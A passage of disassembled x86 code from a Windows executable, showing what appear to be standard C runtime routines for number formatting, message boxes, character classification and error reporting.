; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C19F      proc near               ; CODE XREF: sub_41C354+26↓p

var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_1C          = byte ptr -1Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 2Ch
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                push    16h
                pop     esi
                push    esi
                lea     ecx, [ebp+var_1C]
                push    ecx
                lea     ecx, [ebp+var_2C]
                push    ecx
                push    dword ptr [eax+4]
                push    dword ptr [eax]
                call    sub_41D269
                xor     ebx, ebx
                add     esp, 14h
                cmp     edi, ebx
                jnz     short loc_41C1F1

loc_41C1D9:                             ; CODE XREF: sub_41C19F+57↓j
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     [eax], esi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_41C24B
; ---------------------------------------------------------------------------

loc_41C1F1:                             ; CODE XREF: sub_41C19F+38↑j
                mov     eax, [ebp+arg_8]
                cmp     eax, ebx
                jbe     short loc_41C1D9
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41C201
                or      eax, eax
                jmp     short loc_41C20C
; ---------------------------------------------------------------------------

loc_41C201:                             ; CODE XREF: sub_41C19F+5C↑j
                xor     ecx, ecx
                cmp     [ebp+var_2C], 2Dh
                setz    cl
                sub     eax, ecx

loc_41C20C:                             ; CODE XREF: sub_41C19F+60↑j
                mov     esi, [ebp+arg_C]
                lea     ecx, [ebp+var_2C]
                push    ecx
                mov     ecx, [ebp+var_28]
                add     ecx, esi
                push    ecx
                push    eax
                xor     eax, eax
                cmp     [ebp+var_2C], 2Dh
                setz    al
                add     eax, edi
                push    eax
                call    sub_41D0ED
                add     esp, 10h
                cmp     eax, ebx
                jz      short loc_41C236
                mov     [edi], bl
                jmp     short loc_41C24B
; ---------------------------------------------------------------------------

loc_41C236:                             ; CODE XREF: sub_41C19F+91↑j
                push    [ebp+arg_10]
                lea     eax, [ebp+var_2C]
                push    ebx
                push    esi
                push    [ebp+arg_8]
                mov     ecx, edi
                call    sub_41C0A8
                add     esp, 10h

loc_41C24B:                             ; CODE XREF: sub_41C19F+50↑j
                                        ; sub_41C19F+95↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41C19F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C25A      proc near               ; CODE XREF: sub_41C354+4C↓p

var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_20          = dword ptr -20h
var_1C          = byte ptr -1Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 30h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                push    esi
                mov     esi, [ebp+arg_4]
                push    edi
                push    16h
                pop     edi
                push    edi
                lea     ecx, [ebp+var_1C]
                push    ecx
                lea     ecx, [ebp+var_30]
                push    ecx
                push    dword ptr [eax+4]
                push    dword ptr [eax]
                call    sub_41D269
                xor     ebx, ebx
                add     esp, 14h
                cmp     esi, ebx
                jnz     short loc_41C2AF

loc_41C294:                             ; CODE XREF: sub_41C25A+5A↓j
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     [eax], edi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, edi
                jmp     loc_41C345
; ---------------------------------------------------------------------------

loc_41C2AF:                             ; CODE XREF: sub_41C25A+38↑j
                mov     ecx, [ebp+arg_8]
                cmp     ecx, ebx
                jbe     short loc_41C294
                mov     eax, [ebp+var_2C]
                dec     eax
                mov     [ebp+var_20], eax
                xor     eax, eax
                cmp     [ebp+var_30], 2Dh
                setz    al
                lea     edi, [eax+esi]
                cmp     ecx, 0FFFFFFFFh
                jnz     short loc_41C2D2
                or      ecx, ecx
                jmp     short loc_41C2D4
; ---------------------------------------------------------------------------

loc_41C2D2:                             ; CODE XREF: sub_41C25A+72↑j
                sub     ecx, eax

loc_41C2D4:                             ; CODE XREF: sub_41C25A+76↑j
                lea     eax, [ebp+var_30]
                push    eax
                push    [ebp+arg_C]
                push    ecx
                push    edi
                call    sub_41D0ED
                add     esp, 10h
                cmp     eax, ebx
                jz      short loc_41C2ED
                mov     [esi], bl
                jmp     short loc_41C345
; ---------------------------------------------------------------------------

loc_41C2ED:                             ; CODE XREF: sub_41C25A+8D↑j
                mov     eax, [ebp+var_2C]
                dec     eax
                cmp     [ebp+var_20], eax
                setl    cl
                cmp     eax, 0FFFFFFFCh
                jl      short loc_41C329
                cmp     eax, [ebp+arg_C]
                jge     short loc_41C329
                cmp     cl, bl
                jz      short loc_41C30F

loc_41C305:                             ; CODE XREF: sub_41C25A+B0↓j
                mov     al, [edi]
                inc     edi
                test    al, al
                jnz     short loc_41C305
                mov     [edi-2], bl

loc_41C30F:                             ; CODE XREF: sub_41C25A+A9↑j
                push    [ebp+arg_14]
                lea     eax, [ebp+var_30]
                push    1
                push    [ebp+arg_C]
                mov     ecx, esi
                push    [ebp+arg_8]
                call    sub_41C0A8
                add     esp, 10h
                jmp     short loc_41C345
; ---------------------------------------------------------------------------

loc_41C329:                             ; CODE XREF: sub_41C25A+A0↑j
                                        ; sub_41C25A+A5↑j
                push    [ebp+arg_14]
                lea     eax, [ebp+var_30]
                push    1
                push    eax
                push    [ebp+arg_10]
                mov     eax, esi
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                call    sub_41BAD6
                add     esp, 18h

loc_41C345:                             ; CODE XREF: sub_41C25A+50↑j
                                        ; sub_41C25A+91↑j ...
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41C25A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C354      proc near               ; CODE XREF: sub_41C3DC+19↓p
                                        ; DATA XREF: sub_4156A4+37↑o

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
arg_18          = dword ptr  20h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_C]
                cmp     eax, 65h
                jz      short loc_41C3C0
                cmp     eax, 45h
                jz      short loc_41C3C0
                cmp     eax, 66h
                jnz     short loc_41C384
                push    [ebp+arg_18]
                push    [ebp+arg_10]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41C19F
                add     esp, 14h
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41C384:                             ; CODE XREF: sub_41C354+15↑j
                cmp     eax, 61h
                jz      short loc_41C3A7
                cmp     eax, 41h
                jz      short loc_41C3A7
                push    [ebp+arg_18]
                push    [ebp+arg_14]
                push    [ebp+arg_10]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41C25A
                jmp     short loc_41C3D7
; ---------------------------------------------------------------------------

loc_41C3A7:                             ; CODE XREF: sub_41C354+33↑j
                                        ; sub_41C354+38↑j
                push    [ebp+arg_18]
                push    [ebp+arg_14]
                push    [ebp+arg_10]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41BD35
                jmp     short loc_41C3D7
; ---------------------------------------------------------------------------

loc_41C3C0:                             ; CODE XREF: sub_41C354+B↑j
                                        ; sub_41C354+10↑j
                push    [ebp+arg_18]
                push    [ebp+arg_14]
                push    [ebp+arg_10]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41BC45

loc_41C3D7:                             ; CODE XREF: sub_41C354+51↑j
                                        ; sub_41C354+6A↑j
                add     esp, 18h
                pop     ebp
                retn
sub_41C354      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C3DC      proc near               ; DATA XREF: sub_4156A4↑o

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_14]
                push    [ebp+arg_10]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41C354
                add     esp, 1Ch
                pop     ebp
                retn
sub_41C3DC      endp


; =============== S U B R O U T I N E =======================================


sub_41C3FF      proc near               ; CODE XREF: sub_415704+1A↑p
                mov     edi, edi
                push    esi
                push    30000h
                push    10000h
                xor     esi, esi
                push    esi
                call    sub_41D3FF
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_41C428
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h

loc_41C428:                             ; CODE XREF: sub_41C3FF+1A↑j
                pop     esi
                retn
sub_41C3FF      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C42A      proc near               ; CODE XREF: sub_41C468:loc_41C48C↓j

var_18          = qword ptr -18h
var_10          = qword ptr -10h
var_8           = qword ptr -8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                fld     ds:dbl_4214C0
                fstp    [ebp+var_10]
                fld     ds:dbl_4214B8
                fstp    [ebp+var_18]
                fld     [ebp+var_18]
                fdiv    [ebp+var_10]
                fmul    [ebp+var_10]
                fsubr   [ebp+var_18]
                fstp    [ebp+var_8]
                fld1
                fcomp   [ebp+var_8]
                fnstsw  ax
                test    ah, 5
                jp      short loc_41C464
                xor     eax, eax
                inc     eax
                leave
                retn
; ---------------------------------------------------------------------------

loc_41C464:                             ; CODE XREF: sub_41C42A+33↑j
                xor     eax, eax
                leave
                retn
sub_41C42A      endp


; =============== S U B R O U T I N E =======================================


sub_41C468      proc near               ; CODE XREF: sub_415704+A↑p
                push    offset aKernel32 ; "KERNEL32"
                call    ds:GetModuleHandleA
                test    eax, eax
                jz      short loc_41C48C
                push    offset aIsprocessorfea ; "IsProcessorFeaturePresent"
                push    eax             ; hModule
                call    ds:GetProcAddress
                test    eax, eax
                jz      short loc_41C48C
                push    0
                call    eax
                retn
; ---------------------------------------------------------------------------

loc_41C48C:                             ; CODE XREF: sub_41C468+D↑j
                                        ; sub_41C468+1D↑j
                jmp     sub_41C42A
sub_41C468      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C491      proc near               ; CODE XREF: sub_415727+328↑p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_8]
                push    ebx
                push    esi
                xor     esi, esi
                push    edi
                mov     [ebp+var_18], 404Eh
                mov     [eax], esi
                mov     [eax+4], esi
                mov     [eax+8], esi
                cmp     [ebp+arg_4], esi
                jbe     loc_41C609

loc_41C4C3:                             ; CODE XREF: sub_41C491+148↓j
                mov     edx, [eax]
                mov     ebx, [eax+4]
                mov     esi, eax
                lea     edi, [ebp+var_10]
                movsd
                movsd
                movsd
                mov     ecx, edx
                shr     ecx, 1Fh
                lea     edi, [edx+edx]
                lea     edx, [ebx+ebx]
                or      edx, ecx
                mov     ecx, [eax+8]
                mov     esi, ebx
                shr     esi, 1Fh
                add     ecx, ecx
                or      ecx, esi
                mov     [ebp+var_14], edi
                mov     esi, edi
                and     [ebp+var_14], 0
                mov     ebx, edx
                shr     ebx, 1Fh
                add     ecx, ecx
                shr     edi, 1Fh
                or      ecx, ebx
                mov     ebx, [ebp+var_10]
                add     esi, esi
                add     edx, edx
                or      edx, edi
                lea     edi, [esi+ebx]
                mov     [eax], esi
                mov     [eax+4], edx
                mov     [eax+8], ecx
                cmp     edi, esi
                jb      short loc_41C51A
                cmp     edi, ebx
                jnb     short loc_41C521

loc_41C51A:                             ; CODE XREF: sub_41C491+83↑j
                mov     [ebp+var_14], 1

loc_41C521:                             ; CODE XREF: sub_41C491+87↑j
                xor     ebx, ebx
                mov     [eax], edi
                cmp     [ebp+var_14], ebx
                jz      short loc_41C544
                lea     esi, [edx+1]
                cmp     esi, edx
                jb      short loc_41C536
                cmp     esi, 1
                jnb     short loc_41C539

loc_41C536:                             ; CODE XREF: sub_41C491+9E↑j
                xor     ebx, ebx
                inc     ebx

loc_41C539:                             ; CODE XREF: sub_41C491+A3↑j
                mov     [eax+4], esi
                test    ebx, ebx
                jz      short loc_41C544
                inc     ecx
                mov     [eax+8], ecx

loc_41C544:                             ; CODE XREF: sub_41C491+97↑j
                                        ; sub_41C491+AD↑j
                mov     ecx, [eax+4]
                mov     edx, [ebp+var_C]
                lea     ebx, [ecx+edx]
                xor     esi, esi
                cmp     ebx, ecx
                jb      short loc_41C557
                cmp     ebx, edx
                jnb     short loc_41C55A

loc_41C557:                             ; CODE XREF: sub_41C491+C0↑j
                xor     esi, esi
                inc     esi

loc_41C55A:                             ; CODE XREF: sub_41C491+C4↑j
                mov     [eax+4], ebx
                test    esi, esi
                jz      short loc_41C564
                inc     dword ptr [eax+8]

loc_41C564:                             ; CODE XREF: sub_41C491+CE↑j
                mov     ecx, [ebp+var_8]
                add     [eax+8], ecx
                and     [ebp+var_14], 0
                lea     ecx, [edi+edi]
                mov     edx, edi
                shr     edx, 1Fh
                lea     edi, [ebx+ebx]
                or      edi, edx
                mov     edx, [eax+8]
                mov     esi, ebx
                shr     esi, 1Fh
                lea     ebx, [edx+edx]
                mov     edx, [ebp+arg_0]
                or      ebx, esi
                mov     [eax], ecx
                mov     [eax+4], edi
                mov     [eax+8], ebx
                movsx   edx, byte ptr [edx]
                lea     esi, [ecx+edx]
                mov     [ebp+var_10], edx
                cmp     esi, ecx
                jb      short loc_41C5A4
                cmp     esi, edx
                jnb     short loc_41C5AB

loc_41C5A4:                             ; CODE XREF: sub_41C491+10D↑j
                mov     [ebp+var_14], 1

loc_41C5AB:                             ; CODE XREF: sub_41C491+111↑j
                cmp     [ebp+var_14], 0
                mov     [eax], esi
                jz      short loc_41C5CF
                lea     ecx, [edi+1]
                xor     edx, edx
                cmp     ecx, edi
                jb      short loc_41C5C1
                cmp     ecx, 1
                jnb     short loc_41C5C4

loc_41C5C1:                             ; CODE XREF: sub_41C491+129↑j
                xor     edx, edx
                inc     edx

loc_41C5C4:                             ; CODE XREF: sub_41C491+12E↑j
                mov     [eax+4], ecx
                test    edx, edx
                jz      short loc_41C5CF
                inc     ebx
                mov     [eax+8], ebx

loc_41C5CF:                             ; CODE XREF: sub_41C491+120↑j
                                        ; sub_41C491+138↑j
                dec     [ebp+arg_4]
                inc     [ebp+arg_0]
                cmp     [ebp+arg_4], 0
                ja      loc_41C4C3
                xor     esi, esi
                jmp     short loc_41C609
; ---------------------------------------------------------------------------

loc_41C5E3:                             ; CODE XREF: sub_41C491+17B↓j
                mov     ecx, [eax+4]
                mov     edx, ecx
                shr     edx, 10h
                mov     [eax+8], edx
                mov     edx, [eax]
                mov     edi, edx
                shl     ecx, 10h
                shr     edi, 10h
                or      ecx, edi
                shl     edx, 10h
                add     [ebp+var_18], 0FFF0h
                mov     [eax+4], ecx
                mov     [eax], edx

loc_41C609:                             ; CODE XREF: sub_41C491+2C↑j
                                        ; sub_41C491+150↑j
                cmp     [eax+8], esi
                jz      short loc_41C5E3
                mov     ebx, 8000h
                test    [eax+8], ebx
                jnz     short loc_41C648

loc_41C618:                             ; CODE XREF: sub_41C491+1B5↓j
                mov     esi, [eax]
                mov     edi, [eax+4]
                add     [ebp+var_18], 0FFFFh
                mov     ecx, esi
                add     esi, esi
                shr     ecx, 1Fh
                mov     [eax], esi
                lea     esi, [edi+edi]
                or      esi, ecx
                mov     ecx, [eax+8]
                mov     edx, edi
                shr     edx, 1Fh
                add     ecx, ecx
                or      ecx, edx
                mov     [eax+4], esi
                mov     [eax+8], ecx
                test    ebx, ecx
                jz      short loc_41C618

loc_41C648:                             ; CODE XREF: sub_41C491+185↑j
                mov     cx, word ptr [ebp+var_18]
                mov     [eax+0Ah], cx
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41C491      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C65F      proc near               ; CODE XREF: sub_41740A+16A↑p

lpProcName      = dword ptr -24h
var_14          = byte ptr -14h
var_C           = byte ptr -0Ch
var_8           = byte ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 14h
                push    ebx
                push    esi
                push    edi
                call    sub_412173
                and     [ebp+var_4], 0
                cmp     dword_42B4A8, 0
                mov     ebx, eax
                jnz     loc_41C710
                push    offset LibFileName ; "USER32.DLL"
                call    ds:LoadLibraryA
                mov     edi, eax
                test    edi, edi
                jz      loc_41C7C1
                mov     esi, ds:GetProcAddress
                push    offset aMessageboxa ; "MessageBoxA"
                push    edi             ; hModule
                call    esi ; GetProcAddress
                test    eax, eax
                jz      loc_41C7C1
                push    eax
                call    sub_412101
                mov     [esp+24h+lpProcName], offset aGetactivewindo ; "GetActiveWindow"
                push    edi             ; hModule
                mov     dword_42B4A8, eax
                call    esi ; GetProcAddress
                push    eax
                call    sub_412101
                mov     [esp+24h+lpProcName], offset aGetlastactivep ; "GetLastActivePopup"
                push    edi             ; hModule
                mov     dword_42B4AC, eax
                call    esi ; GetProcAddress
                push    eax
                call    sub_412101
                mov     [esp+24h+lpProcName], offset aGetuserobjecti ; "GetUserObjectInformationA"
                push    edi             ; hModule
                mov     dword_42B4B0, eax
                call    esi ; GetProcAddress
                push    eax
                call    sub_412101
                pop     ecx
                mov     dword_42B4B8, eax
                test    eax, eax
                jz      short loc_41C710
                push    offset aGetprocesswind ; "GetProcessWindowStation"
                push    edi             ; hModule
                call    esi ; GetProcAddress
                push    eax
                call    sub_412101
                pop     ecx
                mov     dword_42B4B4, eax

loc_41C710:                             ; CODE XREF: sub_41C65F+1D↑j
                                        ; sub_41C65F+9B↑j
                mov     eax, dword_42B4B4
                cmp     eax, ebx
                jz      short loc_41C768
                cmp     dword_42B4B8, ebx
                jz      short loc_41C768
                push    eax
                call    sub_41217C
                push    dword_42B4B8
                mov     esi, eax
                call    sub_41217C
                pop     ecx
                pop     ecx
                mov     edi, eax
                test    esi, esi
                jz      short loc_41C768
                test    edi, edi
                jz      short loc_41C768
                call    esi
                test    eax, eax
                jz      short loc_41C75F
                lea     ecx, [ebp+var_8]
                push    ecx
                push    0Ch
                lea     ecx, [ebp+var_14]
                push    ecx
                push    1
                push    eax
                call    edi
                test    eax, eax
                jz      short loc_41C75F
                test    [ebp+var_C], 1
                jnz     short loc_41C768

loc_41C75F:                             ; CODE XREF: sub_41C65F+E5↑j
                                        ; sub_41C65F+F8↑j
                or      [ebp+arg_8], 200000h
                jmp     short loc_41C7A1
; ---------------------------------------------------------------------------

loc_41C768:                             ; CODE XREF: sub_41C65F+B8↑j
                                        ; sub_41C65F+C0↑j ...
                mov     eax, dword_42B4AC
                cmp     eax, ebx
                jz      short loc_41C7A1
                push    eax
                call    sub_41217C
                pop     ecx
                test    eax, eax
                jz      short loc_41C7A1
                call    eax
                mov     [ebp+var_4], eax
                test    eax, eax
                jz      short loc_41C7A1
                mov     eax, dword_42B4B0
                cmp     eax, ebx
                jz      short loc_41C7A1
                push    eax
                call    sub_41217C
                pop     ecx
                test    eax, eax
                jz      short loc_41C7A1
                push    [ebp+var_4]
                call    eax
                mov     [ebp+var_4], eax

loc_41C7A1:                             ; CODE XREF: sub_41C65F+107↑j
                                        ; sub_41C65F+110↑j ...
                push    dword_42B4A8
                call    sub_41217C
                pop     ecx
                test    eax, eax
                jz      short loc_41C7C1
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                push    [ebp+var_4]
                call    eax
                jmp     short loc_41C7C3
; ---------------------------------------------------------------------------

loc_41C7C1:                             ; CODE XREF: sub_41C65F+32↑j
                                        ; sub_41C65F+48↑j ...
                xor     eax, eax

loc_41C7C3:                             ; CODE XREF: sub_41C65F+160↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_41C65F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C7C8      proc near               ; CODE XREF: sub_41740A+31↑p
                                        ; sub_41740A+42↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                push    esi
                xor     esi, esi
                cmp     ecx, esi
                jl      short loc_41C7F5
                cmp     ecx, 2
                jle     short loc_41C7E8
                cmp     ecx, 3
                jnz     short loc_41C7F5
                mov     eax, dword_42AADC
                jmp     short loc_41C810
; ---------------------------------------------------------------------------

loc_41C7E8:                             ; CODE XREF: sub_41C7C8+12↑j
                mov     eax, dword_42AADC
                mov     dword_42AADC, ecx
                jmp     short loc_41C810
; ---------------------------------------------------------------------------

loc_41C7F5:                             ; CODE XREF: sub_41C7C8+D↑j
                                        ; sub_41C7C8+17↑j
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh

loc_41C810:                             ; CODE XREF: sub_41C7C8+1E↑j
                                        ; sub_41C7C8+2B↑j
                pop     esi
                pop     ebp
                retn
sub_41C7C8      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C813      proc near               ; CODE XREF: sub_41C866+E↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = byte ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = byte ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_0]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                movzx   eax, [ebp+arg_4]
                mov     ecx, [ebp+var_C]
                mov     dl, [ebp+arg_C]
                test    [ecx+eax+1Dh], dl
                jnz     short loc_41C854
                cmp     [ebp+arg_8], 0
                jz      short loc_41C84E
                mov     ecx, [ebp+var_10]
                mov     ecx, [ecx+0C8h]
                movzx   eax, word ptr [ecx+eax*2]
                and     eax, [ebp+arg_8]
                jmp     short loc_41C850
; ---------------------------------------------------------------------------

loc_41C84E:                             ; CODE XREF: sub_41C813+27↑j
                xor     eax, eax

loc_41C850:                             ; CODE XREF: sub_41C813+39↑j
                test    eax, eax
                jz      short loc_41C857

loc_41C854:                             ; CODE XREF: sub_41C813+21↑j
                xor     eax, eax
                inc     eax

loc_41C857:                             ; CODE XREF: sub_41C813+3F↑j
                cmp     [ebp+var_4], 0
                jz      short locret_41C864
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_41C864:                          ; CODE XREF: sub_41C813+48↑j
                leave
                retn
sub_41C813      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C866      proc near               ; CODE XREF: sub_41771C+55↑p
                                        ; sub_41771C+13A↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    4
                push    0
                push    [ebp+arg_0]
                push    0
                call    sub_41C813
                add     esp, 10h
                pop     ebp
                retn
sub_41C866      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C87E      proc near               ; CODE XREF: sub_418086+59↑p
                                        ; sub_418086+6A↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                inc     eax
                cmp     [ebp+arg_0], 0
                jnz     short loc_41C88E
                xor     eax, eax

loc_41C88E:                             ; CODE XREF: sub_41C87E+C↑j
                pop     ebp
                retn
sub_41C87E      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_41C890      proc near               ; CODE XREF: sub_418843:loc_418871↑p

var_328         = dword ptr -328h
var_31C         = dword ptr -31Ch
ExceptionInfo   = _EXCEPTION_POINTERS ptr -2D8h
var_2D0         = dword ptr -2D0h
var_244         = word ptr -244h
var_240         = word ptr -240h
var_23C         = word ptr -23Ch
var_238         = word ptr -238h
var_234         = dword ptr -234h
var_230         = dword ptr -230h
var_22C         = dword ptr -22Ch
var_228         = dword ptr -228h
var_224         = dword ptr -224h
var_220         = dword ptr -220h
var_21C         = dword ptr -21Ch
var_218         = dword ptr -218h
var_214         = word ptr -214h
var_210         = dword ptr -210h
var_20C         = dword ptr -20Ch
var_208         = word ptr -208h
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 328h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                test    byte_42622C, 1
                push    esi
                jz      short loc_41C8B7
                push    0Ah
                call    sub_41740A
                pop     ecx

loc_41C8B7:                             ; CODE XREF: sub_41C890+1D↑j
                call    sub_419AB7
                test    eax, eax
                jz      short loc_41C8C8
                push    16h
                call    sub_419AC4
                pop     ecx

loc_41C8C8:                             ; CODE XREF: sub_41C890+2E↑j
                test    byte_42622C, 2
                jz      loc_41C99F
                mov     [ebp+var_220], eax
                mov     [ebp+var_224], ecx
                mov     [ebp+var_228], edx
                mov     [ebp+var_22C], ebx
                mov     [ebp+var_230], esi
                mov     [ebp+var_234], edi
                mov     [ebp+var_208], ss
                mov     [ebp+var_214], cs
                mov     [ebp+var_238], ds
                mov     [ebp+var_23C], es
                mov     [ebp+var_240], fs
                mov     [ebp+var_244], gs
                pushf
                pop     [ebp+var_210]
                mov     esi, [ebp+4]
                lea     eax, [ebp+4]
                mov     [ebp+var_20C], eax
                mov     [ebp+var_2D0], 10001h
                mov     [ebp+var_218], esi
                mov     eax, [eax-4]
                push    50h
                mov     [ebp+var_21C], eax
                lea     eax, [ebp+var_328]
                push    0
                push    eax
                call    sub_413520
                lea     eax, [ebp+var_328]
                add     esp, 0Ch
                mov     [ebp+ExceptionInfo.ExceptionRecord], eax
                lea     eax, [ebp+var_2D0]
                push    0               ; lpTopLevelExceptionFilter
                mov     [ebp+var_328], 40000015h
                mov     [ebp+var_31C], esi
                mov     [ebp+ExceptionInfo.ContextRecord], eax
                call    ds:SetUnhandledExceptionFilter
                lea     eax, [ebp+ExceptionInfo]
                push    eax             ; ExceptionInfo
                call    ds:UnhandledExceptionFilter

loc_41C99F:                             ; CODE XREF: sub_41C890+3F↑j
                push    3               ; uExitCode
                call    sub_412FEB
                int     3               ; Trap to Debugger
sub_41C890      endp


; =============== S U B R O U T I N E =======================================


sub_41C9A7      proc near               ; DATA XREF: .data:off_425DE0↓o
                                        ; .data:off_425DE4↓o ...
                push    2
                call    sub_412D65
                pop     ecx
                retn
sub_41C9A7      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C9B0      proc near               ; CODE XREF: sub_41E552+5D↓p

var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_8           = byte ptr -8
CharType        = word ptr -4
SrcStr          = word ptr  8
arg_4           = word ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, 0FFFFh
                sub     esp, 14h
                cmp     [ebp+SrcStr], ax
                jnz     short loc_41C9C9
                and     dword ptr [ebp+CharType], 0
                jmp     short loc_41CA2E
; ---------------------------------------------------------------------------

loc_41C9C9:                             ; CODE XREF: sub_41C9B0+11↑j
                mov     eax, 100h
                cmp     [ebp+SrcStr], ax
                jnb     short loc_41C9EE
                movzx   eax, [ebp+SrcStr]
                mov     ecx, off_425E14
                mov     ax, [ecx+eax*2]
                and     ax, [ebp+arg_4]
                movzx   eax, ax
                mov     dword ptr [ebp+CharType], eax
                jmp     short loc_41CA2E
; ---------------------------------------------------------------------------

loc_41C9EE:                             ; CODE XREF: sub_41C9B0+22↑j
                push    [ebp+arg_8]
                lea     ecx, [ebp+var_14]
                call    sub_40E461
                mov     eax, [ebp+var_14]
                push    dword ptr [eax+14h]
                push    dword ptr [eax+4]
                lea     eax, [ebp+CharType]
                push    eax             ; lpCharType
                push    1               ; cchSrc
                lea     eax, [ebp+SrcStr]
                push    eax             ; lpSrcStr
                lea     eax, [ebp+var_14]
                push    1               ; dwInfoType
                push    eax             ; int
                call    sub_41D46B
                add     esp, 1Ch
                test    eax, eax
                jnz     short loc_41CA21
                and     dword ptr [ebp+CharType], eax

loc_41CA21:                             ; CODE XREF: sub_41C9B0+6C↑j
                cmp     [ebp+var_8], 0
                jz      short loc_41CA2E
